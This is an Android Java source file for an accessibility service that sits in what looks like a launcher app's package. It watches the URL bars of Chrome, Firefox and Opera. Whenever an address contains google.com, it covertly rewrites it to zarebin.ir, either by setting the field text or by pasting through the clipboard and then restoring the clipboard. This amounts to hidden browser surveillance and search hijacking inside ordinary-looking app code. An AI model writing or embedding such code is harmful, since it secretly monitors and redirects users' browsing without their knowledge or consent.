package com.benny.openlauncher.service;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.ActivityNotFoundException;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.support.annotation.NonNull;
import android.support.v4.view.accessibility.AccessibilityNodeInfoCompat;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.EditText;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;

public class MyAccessibilityService extends AccessibilityService {

    private final HashMap<String, Long> previousUrlDetections = new HashMap<>();
    private AccessibilityEvent event;

    @Override
    protected void onServiceConnected() {
        AccessibilityServiceInfo info = getServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED;
        info.packageNames = packageNames();
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_VISUAL;
        info.notificationTimeout = 300;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            info.flags = AccessibilityServiceInfo.DEFAULT |
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                    AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY |
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS |
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
        }
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;

        this.setServiceInfo(info);
    }

    private String captureUrl(AccessibilityNodeInfo info, SupportedBrowserConfig config) {
        List<AccessibilityNodeInfo> nodes = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.JELLY_BEAN_MR2) {
            nodes = info.findAccessibilityNodeInfosByViewId(config.addressBarId);
        }
        if (nodes == null || nodes.size() <= 0) {
            return null;
        }

        AccessibilityNodeInfo addressBarNodeInfo = nodes.get(0);
        String url = null;
        if (addressBarNodeInfo.getText() != null) {
            url = addressBarNodeInfo.getText().toString();
        }
        addressBarNodeInfo.recycle();
        return url;
    }

    @Override
    public void onAccessibilityEvent(@NonNull AccessibilityEvent event) {
        AccessibilityNodeInfo parentNodeInfo = event.getSource();

        this.event = event;

        if (parentNodeInfo == null) return;

        String packageName = event.getPackageName().toString();
        SupportedBrowserConfig browserConfig = null;

        for (SupportedBrowserConfig supportedConfig : getSupportedBrowsers())
            if (supportedConfig.packageName.equals(packageName)) browserConfig = supportedConfig;

        if (browserConfig == null) return;

        String capturedUrl = captureUrl(parentNodeInfo, browserConfig);

        parentNodeInfo.recycle();

        if (capturedUrl == null) return;

        long eventTime = event.getEventTime();
        String detectionId = packageName + ", and url " + capturedUrl;
        long lastRecordedTime = !previousUrlDetections.containsKey(detectionId) ? 0 : previousUrlDetections.get(detectionId);
        if (eventTime - lastRecordedTime > 2000) {
            previousUrlDetections.put(detectionId, eventTime);
            analyzeCapturedUrl(capturedUrl);
        }
    }

    private void analyzeCapturedUrl(@NonNull String capturedUrl) {
        String baseUrlGoogle = "google.com";
        String baseUrlZarebin = "zarebin.ir";
        if (capturedUrl.contains("google.com")) {
            performRedirect(capturedUrl, baseUrlGoogle, baseUrlZarebin);
        }
    }


    private void performRedirect(String capturedUrl, String baseUrlGoogle, String baseUrlZarebin) {
        String result = capturedUrl.replace(baseUrlGoogle, baseUrlZarebin);
        try {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null & event.getClassName().equals("android.widget.EditText")) {
                Bundle arguments = new Bundle();
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    arguments.putCharSequence(AccessibilityNodeInfo
                            .ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, result);
                    source.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
                    source.performAction(AccessibilityNodeInfo.FOCUS_INPUT,arguments);

                } else {

                    ClipboardManager clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                    if (clipboardManager != null) {
                        String lastClip = "";
                        ClipData clipData = clipboardManager.getPrimaryClip();
                        if (clipData != null)
                            lastClip = clipData.getItemAt(0).coerceToText(getApplicationContext()).toString();
                        clipboardManager.setPrimaryClip(ClipData.newPlainText("label", result));
                        source.performAction(Build.VERSION_CODES.JELLY_BEAN_MR2 <= Build.VERSION.SDK_INT ? AccessibilityNodeInfo.ACTION_PASTE : AccessibilityNodeInfoCompat.ACTION_PASTE);
                        clipboardManager.setPrimaryClip(ClipData.newPlainText(lastClip, lastClip));
                    }
                }
            }
        } catch (ActivityNotFoundException e) {
            // the expected browser is not installed
            e.printStackTrace();
        }
    }


    @Override
    public void onInterrupt() {
    }

    @NonNull
    private static String[] packageNames() {
        List<String> packageNames = new ArrayList<>();
        for (SupportedBrowserConfig config : getSupportedBrowsers()) {
            packageNames.add(config.packageName);
        }
        return packageNames.toArray(new String[0]);
    }

    private static class SupportedBrowserConfig {
        public String packageName, addressBarId;

        public SupportedBrowserConfig(String packageName, String addressBarId) {
            this.packageName = packageName;
            this.addressBarId = addressBarId;
        }
    }


    @NonNull
    private static List<SupportedBrowserConfig> getSupportedBrowsers() {
        List<SupportedBrowserConfig> browsers = new ArrayList<>();
        browsers.add(new SupportedBrowserConfig("com.android.chrome", "com.android.chrome:id/url_bar"));
        browsers.add(new SupportedBrowserConfig("org.mozilla.firefox", "org.mozilla.firefox:id/url_bar_title"));
        browsers.add(new SupportedBrowserConfig("com.opera.browser", "com.opera.browser:id/url_field"));
        return browsers;
    }
}